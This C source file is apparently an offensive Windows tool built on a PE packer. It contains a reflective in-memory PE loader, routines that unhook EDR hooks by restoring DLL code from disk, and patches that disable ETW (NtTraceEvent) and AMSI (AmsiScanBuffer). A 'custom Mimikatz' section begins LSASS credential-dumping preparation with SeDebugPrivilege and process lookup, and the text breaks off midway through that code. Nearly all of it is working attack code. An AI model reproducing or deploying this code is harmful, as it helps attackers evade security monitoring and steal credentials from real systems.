//https://github.com/NUL0x4C/AtomPePacker
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <winternl.h>
#include <psapi.h>
//#include "minidumpapiset.h"


#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Version.lib")

void ListLoadedModules();

typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct _InPeConfig {
	ULONG_PTR				pPeAddress;
	SIZE_T					sPeSize;
	PIMAGE_DOS_HEADER		pDosHdr;
	PIMAGE_NT_HEADERS		pNtHdr;
	PIMAGE_DATA_DIRECTORY	pEIDataDir;		//IMAGE_DIRECTORY_ENTRY_IMPORT
	PIMAGE_DATA_DIRECTORY	pTLSDataDir;	//IMAGE_DIRECTORY_ENTRY_TLS
	PIMAGE_DATA_DIRECTORY	pEBDataDir;		//IMAGE_DIRECTORY_ENTRY_BASERELOC
	PIMAGE_DATA_DIRECTORY	pEHDataDir;		//IMAGE_DIRECTORY_ENTRY_EXCEPTION
	PIMAGE_SECTION_HEADER	pSecHdr;
} InPeConfig, * PInPeConfig;

BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {
	if (pPeAddress == NULL || sPeSize == NULL) {
		return FALSE;
	}
	_Pe->pPeAddress = pPeAddress;
	_Pe->sPeSize = sPeSize;
	_Pe->pDosHdr = (PIMAGE_DOS_HEADER)pPeAddress;
	if (_Pe->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	


	_Pe->pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pPeAddress + _Pe->pDosHdr->e_lfanew);
	if (_Pe->pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	_Pe->pEIDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	_Pe->pTLSDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	_Pe->pEBDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	_Pe->pEHDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	_Pe->pSecHdr = (PIMAGE_SECTION_HEADER)((SIZE_T)_Pe->pNtHdr + sizeof(IMAGE_NT_HEADERS));
	printf("BASE : %p\n", _Pe->pPeAddress);
	printf("Addr sec : %p\n", _Pe->pSecHdr);
	printf("Addr sec : %p\n", &_Pe->pSecHdr[6]);
	for (int i = 0; i < _Pe->pNtHdr->FileHeader.NumberOfSections; ++i) {
		printf("Section %d. PointerToRawData=%p. size=%d\n", i, _Pe->pSecHdr[i].PointerToRawData, _Pe->pSecHdr[i].SizeOfRawData);
	}
	if (_Pe->pDosHdr == NULL || _Pe->pNtHdr == NULL ||
		_Pe->pEIDataDir == NULL || _Pe->pTLSDataDir == NULL || _Pe->pEBDataDir == NULL || _Pe->pEHDataDir == NULL ||
		_Pe->pSecHdr == NULL
		) {
		return FALSE;
	}
	return TRUE;
}

BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {

	PIMAGE_IMPORT_DESCRIPTOR	pImgDes = NULL;
	for (SIZE_T i = 0; i < _Pe.pEIDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImgDes = (IMAGE_IMPORT_DESCRIPTOR*)(_Pe.pEIDataDir->VirtualAddress + (ULONG_PTR)pPeAddress + i);
		if (pImgDes->OriginalFirstThunk == NULL && pImgDes->FirstThunk == NULL) {
			break;
		}
		LPSTR		DllName = (LPSTR)((ULONGLONG)pPeAddress + pImgDes->Name);
		ULONG_PTR	Head = pImgDes->FirstThunk;
		ULONG_PTR	Next = pImgDes->OriginalFirstThunk;
		SIZE_T		HeadSize = 0;
		SIZE_T		NextSize = 0;
		HMODULE		hModule = LoadLibraryA(DllName);
		if (hModule == NULL) {
			return FALSE;
		}
		if (Next == NULL) {
			Next = pImgDes->FirstThunk;
		}
		while (TRUE) {
			PIMAGE_THUNK_DATA			_1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + HeadSize + Head);
			PIMAGE_THUNK_DATA			Orig1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + NextSize + Next);
			PIMAGE_IMPORT_BY_NAME		FuncName = NULL;
			ULONG_PTR					pFunction = NULL;
			if (_1stThunk->u1.Function == NULL) {
				break;
			}
			if (Orig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				PIMAGE_DOS_HEADER		_dos;
				PIMAGE_NT_HEADERS		_nt;
				PIMAGE_EXPORT_DIRECTORY	_ExportDir;
				PDWORD					_FuncAddArray;

				_dos = (PIMAGE_DOS_HEADER)hModule;
				_nt = (PIMAGE_NT_HEADERS)(((ULONG_PTR)hModule) + _dos->e_lfanew);
				_ExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				_FuncAddArray = (PDWORD)((ULONG_PTR)hModule + _ExportDir->AddressOfFunctions);

				pFunction = ((ULONG_PTR)hModule + _FuncAddArray[Orig1stThunk->u1.Ordinal]);
				printf("Ordinal\n");
			}
			else {
				FuncName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeAddress + Orig1stThunk->u1.AddressOfData);
				pFunction = (ULONG_PTR)GetProcAddress(hModule, FuncName->Name);
			}
			if (pFunction == NULL) {
				return FALSE;
			}
			_1stThunk->u1.Function = (ULONGLONG)pFunction;
			HeadSize += sizeof(IMAGE_THUNK_DATA);
			NextSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir) {
	PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
	ULONG_PTR				OffsetIB = ActualAddress - PreferableAddress;
	PBASE_RELOCATION_ENTRY	Reloc = NULL;
	
	while (pImageBR->VirtualAddress != 0) {
		Reloc = (PBASE_RELOCATION_ENTRY)(pImageBR + 1);
		
		while ((PBYTE)Reloc != (PBYTE)pImageBR + pImageBR->SizeOfBlock) {
			switch (Reloc->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += (DWORD)OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += HIWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += LOWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				return FALSE;
			}
			Reloc++;
		}
		pImageBR = (PIMAGE_BASE_RELOCATION)Reloc;
	}
	
	return TRUE;
}

VOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
	
	InPeConfig				_Pe1 = { 0 };
	ULONG_PTR				pAddress = NULL;
	if (!_InitPeStruct(&_Pe1, pPeAddress, sPeSize)) {
		return;
	}
	pAddress = (unsigned char*)VirtualAlloc(NULL, _Pe1.pNtHdr->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pAddress == NULL) {
		return;
	}
	
	memcpy(pAddress, pPeAddress, _Pe1.pNtHdr->OptionalHeader.SizeOfHeaders);	


	
	for (int i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {
		memcpy(pAddress + _Pe1.pSecHdr[i].VirtualAddress, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
	}
	
	if (!_FixImportAddressTable(_Pe1, pAddress)) {
		return;
	}
	
	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase) {
		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress))) {
			return;
		}
	}
	
	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);


	ListLoadedModules();

	printf("PREPARING.....................\n");
	Sleep(3000);
	((VOID(*)())EP)();
}

unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
	FILE* file = fopen(filename, "rb");
	if (file == NULL) {
		return NULL;
	}
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	unsigned char* pe_mem = calloc(1, size);
	fread(pe_mem, size, 1, file);
	fclose(file);
	*ret_size = size;
	return pe_mem;
}
void* merge(PCHAR dst, PCHAR src) {
	int i = 0;
	for (int i = 0; i < 100000 && dst[i] != src[i]; ++i) {
		dst[i] = src[i];
	}
}

int ListDllFunctions(const unsigned char* dllPath, LPVOID baseAddress_infile, LPVOID baseAddress_inmem, DWORD size_text_inmem, PCHAR addr_text_inmem, PCHAR size_text_infile, PCHAR addr_text_infile, PIMAGE_SECTION_HEADER pSecHdr_inmem, PIMAGE_SECTION_HEADER pSecHdr_infile) {

	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
		if (ret == 0) {
			printf("VirtualProtect failed\n");
			exit(-1);
		}
	}


	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	PIMAGE_DOS_HEADER dosHeader_infile = (PIMAGE_DOS_HEADER)baseAddress_infile;
	if (dosHeader_infile->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	PIMAGE_NT_HEADERS ntHeaders_infile = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_infile + dosHeader_infile->e_lfanew);
	if (ntHeaders_infile->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	PIMAGE_EXPORT_DIRECTORY exportDirectory_infile;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	DWORD exportDirRVA_infile = ntHeaders_infile->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_infile == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);
	exportDirectory_infile = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_infile + exportDirRVA_infile);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);
	DWORD* nameRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);
	DWORD* functionRVAs_infile = (DWORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);
	WORD* ordinals_infile = (WORD*)((BYTE*)baseAddress_infile + exportDirectory_infile->AddressOfNameOrdinals);

	printf("Exported functions from %s:\n", dllPath);
	if (exportDirectory_infile->NumberOfNames != exportDirectory_inmem->NumberOfNames) {
		printf("Error in number of names. File has %d names while mem has %d name\n", exportDirectory_infile->NumberOfNames, exportDirectory_inmem->NumberOfNames);

		FILE* log_infile = fopen("C:\\Users\\sebastien.carre\\log_infile.txt", "w");
		FILE* log_inmem = fopen("C:\\Users\\sebastien.carre\\log_inmem.txt", "w");

		printf("Loggind %d entries for FILE\n", exportDirectory_infile->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
			unsigned char* functionName_infile = (unsigned char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);
			fprintf(log_infile, "%s\n", functionName_infile);
		}
		printf("Loggind %d entries for MEM\n", exportDirectory_inmem->NumberOfNames);
		for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {
			unsigned char* functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
			fprintf(log_inmem, "%s\n", functionName_inmem);
		}
		fclose(log_infile);
		fclose(log_inmem);

		//exit(-1);
	}
	int nb_function_modified = 0;

	unsigned char** addr_inmem_c=malloc(5000 * sizeof(unsigned char *));
	unsigned char** functionName_inmem_c = malloc(5000 * sizeof(unsigned char*));
	if (addr_inmem_c == NULL || functionName_inmem_c == NULL) {
		printf("NULL argv\n");
		exit(-1);
	}

#if 0
	//save mem addresses
	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		unsigned char* functionName_inmem;
		unsigned char* functionName_infile = (unsigned char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);

		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory");
			exit(-1);
		}


		addr_inmem_c[i] = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
		
		functionName_inmem_c[i] = functionName_inmem;
	}

	// check for identical functions
	for (int i = 0; i < exportDirectory_infile->NumberOfNames; ++i) {
		printf("%p : ", addr_inmem_c[i]);
		for (int j = 0; j < exportDirectory_infile->NumberOfNames; ++j)
		{
			if (addr_inmem_c[i] == addr_inmem_c[j]) {
				printf("  %s  ", functionName_inmem_c[j]);
			}
		}
		printf("\n");
		
	}
#endif 

	for (DWORD i = 0; i < exportDirectory_infile->NumberOfNames; i++) {
		DWORD matching_i = 0;

		unsigned char* functionName_inmem;
		unsigned char* functionName_infile = (unsigned char*)((BYTE*)baseAddress_infile + nameRVAs_infile[i]);

		while (matching_i < exportDirectory_inmem->NumberOfNames) {
			functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[matching_i]);
			if (strcmp(functionName_inmem, functionName_infile) == 0) {
				break;
			}
			matching_i++;
		}
		if (matching_i == exportDirectory_inmem->NumberOfNames) {
			printf("a function in file was not found in memory");
			exit(-1);
		}

		


		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[matching_i]]);
		unsigned char* addr_infile = (unsigned char*)((BYTE*)baseAddress_infile + functionRVAs_infile[ordinals_infile[i]]);

		


		if ((long long)addr_infile >= (long long)addr_text_infile && (long long)addr_infile < ((long long)addr_text_infile + size_text_infile)) {
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (strcmp(functionName_inmem, functionName_infile) != 0) {
				printf("Error in function name\n");
				exit(-2);
			}
			if (addr_inmem[0] != addr_infile[0]) {
				int count = 0;
				while (count < 50)
				{
					if (addr_inmem[count] == addr_infile[count] && addr_inmem[count + 1] == addr_infile[count + 1] && addr_inmem[count + 2] == addr_infile[count + 2])
						break;
					count++;
				}

				

				//if (pSecHdr_inmem == NULL || pSecHdr_infile == NULL)
				//{
				printf("function %s (%p) in %s is modified. Restart at offset %d : ", functionName_inmem, addr_inmem, dllPath, count);
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_inmem[i]);
				}
				printf(" was ");
				for (int i = 0; i < count + 1; ++i) {
					printf("%02X", (unsigned char)addr_infile[i]);
				}
				printf("\n");

				//}
				if ((unsigned char)addr_inmem[0] != 0xE9) {
					printf("\t\tWARNING not E9 jump\n");
				}
				else {



					if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
						for (int i = 0; i < count; ++i) {
							addr_inmem[i] = addr_infile[i];
						}
					}
				}


				nb_function_modified++;
				//exit(-3);
			}
			
		}
	}
	if(nb_function_modified > 0)
		printf("\t\tNumber of function modified in %s : %d/%d\n", dllPath, nb_function_modified, exportDirectory_infile->NumberOfNames);
	printf("\n\n\n");

	if (pSecHdr_inmem != NULL && pSecHdr_infile != NULL) {
		int ret;
		ret = VirtualProtect((LPVOID)((DWORD_PTR)baseAddress_inmem + (DWORD_PTR)pSecHdr_inmem->VirtualAddress), pSecHdr_inmem->Misc.VirtualSize, oldProtection, &oldProtectionafter);
		if (ret == 0) {
			printf("VirtualProtectfailed\n");
		}
	}
	return nb_function_modified;

}


void CompareTextSection(PTCHAR szModName, unsigned char *infile, LPVOID BaseOfDll, DWORD *ret_size_text_inmem, PCHAR *ret_addr_text_inmem, DWORD *ret_size_text_infile, PCHAR *ret_addr_text_infile ) {

	PIMAGE_DOS_HEADER dosHdr_inmem = (PIMAGE_DOS_HEADER)BaseOfDll;
	PIMAGE_NT_HEADERS ntHdr_inmem = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_inmem->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_inmem = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));

	size_t sPeSize;
	unsigned char* pPeAddress = infile;
	PIMAGE_DOS_HEADER dosHdr_infile = (PIMAGE_DOS_HEADER)pPeAddress;
	PIMAGE_NT_HEADERS ntHdr_infile = (PIMAGE_NT_HEADERS)((PBYTE)BaseOfDll + dosHdr_infile->e_lfanew);
	PIMAGE_SECTION_HEADER pSecHdr_infile = (PIMAGE_SECTION_HEADER)((SIZE_T)ntHdr_inmem + sizeof(IMAGE_NT_HEADERS));

	
	DWORD size_text_infile=0;
	PCHAR addr_text_infile;
	for (int i = 0; i < ntHdr_infile->FileHeader.NumberOfSections; i++) {
		unsigned char sectionName[9] = { 0 };
		strncpy(sectionName, (unsigned char*)pSecHdr_infile[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_infile = (ULONG_PTR)pPeAddress + pSecHdr_infile[i].PointerToRawData;
			size_text_infile = pSecHdr_infile[i].SizeOfRawData;
			break;
		}
	}

	DWORD size_text_inmem=0;
	PCHAR addr_text_inmem;
	for (int i = 0; i < ntHdr_inmem->FileHeader.NumberOfSections; i++) {
		unsigned char sectionName[9] = { 0 };
		strncpy(sectionName, (unsigned char*)pSecHdr_inmem[i].Name, 8);
		if (strcmp(".text", sectionName) == 0) {
			addr_text_inmem = (ULONG_PTR)BaseOfDll + pSecHdr_inmem[i].VirtualAddress;
			size_text_inmem = pSecHdr_inmem[i].SizeOfRawData;
			break;
		}
	}


	if (size_text_infile != 0 && size_text_inmem != 0 && size_text_infile == size_text_inmem) {
		*ret_addr_text_infile = addr_text_infile;
		*ret_size_text_infile = size_text_infile;
		*ret_addr_text_inmem = addr_text_inmem;
		*ret_size_text_inmem = size_text_inmem;
		//Sleep(10000);		

		if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
			printf("Patching...\n");
			ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, pSecHdr_inmem, pSecHdr_infile);
			printf("Check :\n");
			if (ListDllFunctions(szModName, infile, BaseOfDll, size_text_inmem, addr_text_inmem, size_text_infile, addr_text_infile, NULL, NULL) > 0) {
				printf("FAILED UNHOOK\n");
				exit(-1);
			}
		}
		return;
	}
	else {
		printf("Error sizes are incorrect");
		exit(-1);
	}
}

int patch_amsi(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;



	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {


		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);




		if (strcmp(functionName_inmem, "AmsiScanBuffer") != 0) {
			continue;
		}
		printf("  ** AmsiScanBuffer IS FOUND :) **\n");
		if (addr_inmem[0x83] != 0x74) {
			status = 1;
			VirtualProtect(&addr_inmem[0x83], 1, PAGE_EXECUTE_READWRITE, &oldProtection);
			printf("%x -> ", addr_inmem[0x83]);
			addr_inmem[0x83] = 0x74;//RET instruction
			printf("%x\n", addr_inmem[0x83]);
			VirtualProtect(&addr_inmem[0x83], 1, oldProtection, &oldProtectionafter);
			printf("AmsiScanBuffer patched !\n");
		}
		else {
			printf("AmsiScanBuffer is already patched\n");
		}



	}
	return status;


}

int patch_etw(LPVOID baseAddress_inmem) {
	DWORD oldProtection = 0;
	DWORD oldProtectionafter = 0;
	int status = 0;
	


	PIMAGE_DOS_HEADER dosHeader_inmem = (PIMAGE_DOS_HEADER)baseAddress_inmem;
	if (dosHeader_inmem->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("Invalid DOS signature.\n");
		return;
	}

	PIMAGE_NT_HEADERS ntHeaders_inmem = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress_inmem + dosHeader_inmem->e_lfanew);
	if (ntHeaders_inmem->Signature != IMAGE_NT_SIGNATURE) {
		printf("Invalid NT signature.\n");
		return;
	}

	PIMAGE_EXPORT_DIRECTORY exportDirectory_inmem;
	DWORD exportDirRVA_inmem = ntHeaders_inmem->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (exportDirRVA_inmem == 0) {
		printf("No export table found.\n");
		return;
	}

	exportDirectory_inmem = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)baseAddress_inmem + exportDirRVA_inmem);

	DWORD* nameRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNames);

	DWORD* functionRVAs_inmem = (DWORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfFunctions);

	WORD* ordinals_inmem = (WORD*)((BYTE*)baseAddress_inmem + exportDirectory_inmem->AddressOfNameOrdinals);


	for (DWORD i = 0; i < exportDirectory_inmem->NumberOfNames; i++) {
		

		unsigned char* functionName_inmem = functionName_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + nameRVAs_inmem[i]);
		unsigned char* addr_inmem = (unsigned char*)((BYTE*)baseAddress_inmem + functionRVAs_inmem[ordinals_inmem[i]]);



		
			if (strcmp(functionName_inmem, "NtTraceEvent") != 0) {
				continue;
			}
			printf("  ** NtTraceEvent IS FOUND :) **\n");
			if (addr_inmem[0] != 0xc3) {
				status = 1;
				VirtualProtect(addr_inmem, 1, PAGE_EXECUTE_READWRITE, &oldProtection);
				printf("%x -> ", addr_inmem[0]);
				addr_inmem[0] = 0xc3;//RET instruction
				printf("%x\n", addr_inmem[0]);
				VirtualProtect(addr_inmem, 1, oldProtection, &oldProtectionafter);
				printf("NtTraceEvent patched !\n");
			}
			else {
				printf("NtTraceEvent is already patched\n");
			}
			

		
	}
	return status;

	
}


void ListLoadedModules() {
	HANDLE processHandle = GetCurrentProcess();
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;


	TCHAR current_bin_path[1024];
	DWORD size = GetModuleFileName(NULL, current_bin_path, 1024);


	if (EnumProcessModules(processHandle, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			MODULEINFO modInfo;
			TCHAR szModName[MAX_PATH];

			if (GetModuleInformation(processHandle, hMods[i], &modInfo, sizeof(modInfo))) {
				if (GetModuleFileNameEx(processHandle, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
					if (strcmp(current_bin_path, szModName) != 0) {

						DWORD size_text_inmem;
						PCHAR addr_text_inmem;
						DWORD size_text_infile;
						PCHAR addr_text_infile;
						
						size_t sPeSize;
						unsigned char* infile = get_file(szModName, &sPeSize);
						if (infile == NULL ) {
							printf("Ignoring %s\n", szModName);
							continue;
						}
						else {
							printf("Analysing %s\n", szModName);
						}
											
						CompareTextSection(szModName, infile,modInfo.lpBaseOfDll,&size_text_inmem, &addr_text_inmem, &size_text_infile, &addr_text_infile);


						if (strstr(szModName, "ntdll.dll") != NULL) {
							if (patch_etw(modInfo.lpBaseOfDll) == 1) {
								if (patch_etw(modInfo.lpBaseOfDll) != 0) {
									printf("Patch etw didn't worked\n");
									exit(-1);
								}

							}
							else {
								printf("Error in patch etw. The function is not found");
								exit(-1);
							}
						}

						if (strstr(szModName, "amsi.dll") != NULL) {
							printf("[DEBUG] : AMSI has been found. I expected not to be found\n");
							exit(-1);
							if (patch_amsi(modInfo.lpBaseOfDll) == 1) {
								if (patch_amsi(modInfo.lpBaseOfDll) != 0) {
									printf("Patch amsi didn't worked\n");
									exit(-1);
								}

							}
							else {
								printf("Error in patch amsi. The function is not found");
								exit(-1);
							}
						}
					}
				}
			}
		}
	}
}








/****************************************************************************************************************************/
/****************************************************************************************************************************/
/****************************************************************************************************************************/
/************************************************| CUSTOM MIMICATZ. TO MODIFY |**********************************************/
/****************************************************************************************************************************/
/****************************************************************************************************************************/
/****************************************************************************************************************************/
// https://www.youtube.com/watch?v=mI3FgE1K4PE&list=PLEQL8X1EIhuMGl9dT0u-9MKDMOHFtCdmg&index=20&t=169s&ab_channel=HichamElAaouad
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
// https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6



EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE, PVOID, PVOID, ULONG, PULONG);
#define bool int
#define false 0
#define true 1

bool isElevatedProcess() {
	bool isElevated = false;
	HANDLE access_token;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
		TOKEN_ELEVATION elevation;
		DWORD token_check = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
			isElevated = elevation.TokenIsElevated;
		}
	}
	if (access_token) {
		CloseHandle(access_token);
	}
	return isElevated;
}

DWORD GetProcessIDByName(const char* processName) {
	DWORD processID=0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (snapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 processEntry;
		processEntry.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(snapshot, &processEntry)) {
			do {
				char *currentProcessName = processEntry.szExeFile;
				printf("%s %s\n", currentProcessName, processName);
				if (currentProcessName == processName) {
					processID = processEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(snapshot, &processEntry));
		}
		CloseHandle(snapshot);
	}
	return processID;
}
bool setPrivilege() {
	const wchar_t* privName = L"SeDebugPrivilege";
	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE tokenPriv = NULL;
	LUID luid = { 0,0 };
	bool status = true;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &tokenPriv)) {
		status = false;
		goto EXIT;
	}
	if (!LookupPrivilegeValueW(0, privName, &luid)) {
		status = false;
		goto EXIT;
